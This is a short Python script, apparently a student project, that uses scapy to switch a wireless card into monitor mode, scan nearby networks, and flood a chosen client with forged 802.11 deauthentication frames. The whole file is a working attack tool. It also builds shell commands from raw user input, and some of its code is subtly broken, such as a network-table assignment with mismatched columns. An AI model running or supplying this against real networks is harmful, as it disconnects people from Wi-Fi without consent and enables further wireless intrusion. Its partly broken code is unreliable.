# Moran And Amit 

from scapy.all import *
import pandas
import time
import os
import sys
import re

networks = pandas.DataFrame(columns=["BSSID", "SSID", "dBm_Signal", "Channel", "Crypto"])
networks.set_index("BSSID", inplace=True)
interface = ""
ch = 1
b_mac = 'ff:ff:ff:ff:ff:ff'
snif_time = 60


def bashForMonitor():
    global interface
    os.system("iwconfig")
    interface = input("Enter interface name: \n")
    print("Insert " + interface + " to monitor mode")
    os.system("ifconfig " + interface + " down")
    print(interface + " is down")
    os.system("iwconfig " + interface + " mode monitor")
    print(interface + " is now on mode monitor")
    os.system("ifconfig " + interface + " up")
    print(interface + " is up")
    print("Done. If no new data is being written, monitor mode has failed.")


    
def PacketHandler(p):
    global ch
    ch = (ch % 14) + 1
    os.system(f"iwconfig {interface} channel {ch}")
    if p.haslayer(Dot11Beacon):
        bssid = p[Dot11].addr2
        ssid = p[Dot11Elt].info.decode()
        stats = p[Dot11Beacon].network_stats()
        channel = stats.get("channel")
        networks.loc[bssid] = (ssid, channel)



def is_mac_valid(mac_adr):
    valid = re.match('(?=[a-f0-9]{2}:){5}[a-f0-9]{2}', mac_adr, re.I)
    if valid:
        return True
    else:
        return False



def deauth():
    ssid_mac = input('Please enter the SSID mac for Deauthentication Attack: \n')
    while (not is_mac_valid(ssid_mac)):
        ssid_mac = input('Wrong MAC address please try again: \n')
        is_mac_valid(ssid_mac)
    print('making attack for mac -> %s \n' % ssid_mac)
    chosen = input("Enter client you want to attack: ")
    dot11 = Dot11( addr1 = b_mac , addr2 = chosen ,addr3= ssid_mac )
    packet = RadioTap() / dot11 / Dot11Deauth()
    sendp(packet, inter=0.001, count=1000, iface=interface)
    
      
    
if __name__ == "__main__":
    bashForMonitor()
    print("Scanning for networks\n")
    sniff(prn=PacketHandler, iface=interface, timeout=snif_time)
    print(networks)
    deauth()